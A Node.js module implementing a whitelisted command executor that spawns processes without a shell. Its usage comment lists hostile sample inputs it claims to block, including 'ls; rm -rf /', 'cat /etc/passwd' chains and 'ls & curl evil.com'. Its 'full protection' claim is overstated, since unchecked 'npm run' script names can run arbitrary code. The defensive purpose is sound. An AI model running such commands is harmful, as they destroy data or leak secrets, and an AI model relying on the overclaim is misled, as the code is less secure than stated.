/**
 * SECURE COMMAND EXECUTOR - BASED ON PERPLEXITY RESEARCH
 * NO SHELL ACCESS, FULL PROTECTION AGAINST INJECTION
 */

const { spawn } = require('child_process');

class SecureCommandExecutor {
    constructor() {
        // Whitelist of allowed commands with their permitted arguments
        this.allowedCommands = {
            'ls': {
                command: 'ls',
                allowedArgs: ['-l', '-a', '-la', '-lh', '-lah'],
                timeout: 5000
            },
            'echo': {
                command: 'echo',
                allowedArgs: [], // Special handling for content validation
                timeout: 2000
            },
            'node': {
                command: 'node',
                allowedArgs: ['--version', '-v', '--help'],
                timeout: 10000
            },
            'npm': {
                command: 'npm',
                allowedArgs: ['--version', '-v', 'list', 'help', 'test', 'run'],
                timeout: 30000
            },
            'pwd': {
                command: 'pwd',
                allowedArgs: [],
                timeout: 2000
            },
            'git': {
                command: 'git',
                allowedArgs: ['status', 'log', 'diff', '--version'],
                timeout: 10000
            }
        };
        
        this.maxOutputSize = 1024 * 1024; // 1MB limit
    }

    // Critical: Input sanitization to remove dangerous characters
    sanitizeInput(input) {
        if (typeof input !== 'string') {
            throw new Error('Input must be a string');
        }
        
        return input
            .replace(/[;&|`$(){}\\[\]<>'"]/g, '') // Remove shell metacharacters
            .replace(/\s+/g, ' ') // Normalize whitespace
            .trim()
            .slice(0, 1000); // Limit length
    }

    // Command validation against whitelist
    validateCommand(commandName, args = []) {
        const allowedCommand = this.allowedCommands[commandName];
        if (!allowedCommand) {
            throw new Error(`Command "${commandName}" is not allowed`);
        }

        // Special handling for echo command
        if (commandName === 'echo') {
            args.forEach(arg => {
                const sanitized = this.sanitizeInput(arg);
                if (sanitized !== arg) {
                    throw new Error('Invalid characters detected in argument');
                }
            });
            return true;
        }

        // Special handling for npm run commands
        if (commandName === 'npm' && args[0] === 'run') {
            // Allow npm run with script names, but sanitize them
            const scriptName = args[1];
            if (scriptName) {
                const sanitized = this.sanitizeInput(scriptName);
                if (sanitized !== scriptName) {
                    throw new Error('Invalid characters in npm script name');
                }
            }
            return true;
        }

        // Validate arguments against whitelist
        const invalidArgs = args.filter(arg => 
            !allowedCommand.allowedArgs.includes(arg)
        );
        
        if (invalidArgs.length > 0) {
            throw new Error(`Invalid arguments: ${invalidArgs.join(', ')}`);
        }

        return true;
    }

    // Secure command execution
    async executeCommand(commandName, args = []) {
        return new Promise((resolve, reject) => {
            try {
                this.validateCommand(commandName, args);
                const allowedCommand = this.allowedCommands[commandName];
                
                // Sanitize arguments for echo command
                const sanitizedArgs = commandName === 'echo' 
                    ? args.map(arg => this.sanitizeInput(arg))
                    : args;

                // SECURE: spawn WITHOUT shell
                const child = spawn(allowedCommand.command, sanitizedArgs, {
                    shell: false,  // CRITICAL: No shell interpretation
                    stdio: ['ignore', 'pipe', 'pipe'],
                    timeout: allowedCommand.timeout,
                    env: {
                        // Minimal safe environment
                        PATH: process.env.PATH,
                        NODE_ENV: process.env.NODE_ENV || 'development',
                        // NO sensitive variables
                    },
                    cwd: process.cwd()
                });

                let stdout = '';
                let stderr = '';
                let outputSize = 0;

                // Output size protection
                const checkOutputSize = (data) => {
                    outputSize += data.length;
                    if (outputSize > this.maxOutputSize) {
                        child.kill('SIGTERM');
                        reject(new Error('Output size limit exceeded'));
                        return false;
                    }
                    return true;
                };

                child.stdout.on('data', (data) => {
                    if (checkOutputSize(data)) {
                        stdout += data.toString();
                    }
                });

                child.stderr.on('data', (data) => {
                    if (checkOutputSize(data)) {
                        stderr += data.toString();
                    }
                });

                // Timeout protection
                const timeoutId = setTimeout(() => {
                    child.kill('SIGTERM');
                    reject(new Error('Command execution timeout'));
                }, allowedCommand.timeout);

                child.on('close', (code, signal) => {
                    clearTimeout(timeoutId);
                    
                    if (signal) {
                        reject(new Error(`Process killed with signal: ${signal}`));
                    } else if (code === 0) {
                        resolve({ stdout, stderr, exitCode: code });
                    } else {
                        reject(new Error(`Process exited with code: ${code}\nStderr: ${stderr}`));
                    }
                });

                child.on('error', (error) => {
                    clearTimeout(timeoutId);
                    reject(new Error(`Failed to start process: ${error.message}`));
                });

            } catch (error) {
                reject(error);
            }
        });
    }

    // Helper method to parse command string safely
    parseCommandString(commandString) {
        const parts = commandString.trim().split(/\s+/);
        const command = parts[0];
        const args = parts.slice(1);
        return { command, args };
    }

    // Convenience method for executing from string
    async execute(commandString) {
        const { command, args } = this.parseCommandString(commandString);
        return this.executeCommand(command, args);
    }
}

// Export singleton instance
const secureExecutor = new SecureCommandExecutor();

module.exports = {
    SecureCommandExecutor,
    secureExecutor,
    
    // Export as direct replacement for old executeCommandSecure
    executeCommandSecure: async (commandString, options = {}) => {
        try {
            const { command, args } = secureExecutor.parseCommandString(commandString);
            const result = await secureExecutor.executeCommand(command, args);
            return { 
                output: result.stdout, 
                error: result.stderr 
            };
        } catch (error) {
            throw error;
        }
    }
};

/**
 * USAGE EXAMPLES:
 * 
 * const { secureExecutor } = require('./SecureCommandExecutor');
 * 
 * // Safe execution
 * const result = await secureExecutor.executeCommand('ls', ['-l']);
 * 
 * // Attacks are blocked
 * await secureExecutor.executeCommand('ls', ['; rm -rf /']); // Throws error
 * await secureExecutor.execute('ls && cat /etc/passwd'); // Throws error
 * 
 * SECURITY FEATURES:
 * ✅ No shell access (shell: false)
 * ✅ Command whitelisting
 * ✅ Argument validation
 * ✅ Input sanitization
 * ✅ Timeout protection
 * ✅ Output size limits
 * ✅ Environment isolation
 * 
 * ATTACKS BLOCKED:
 * 🚫 Command injection: ls; rm -rf /
 * 🚫 Command chaining: ls && cat /etc/passwd
 * 🚫 Command substitution: ls $(cat /etc/passwd)
 * 🚫 Background processes: ls & curl evil.com
 * 🚫 Environment access: echo $SECRET_KEY
 * 🚫 Path traversal: ../../../etc/passwd
 */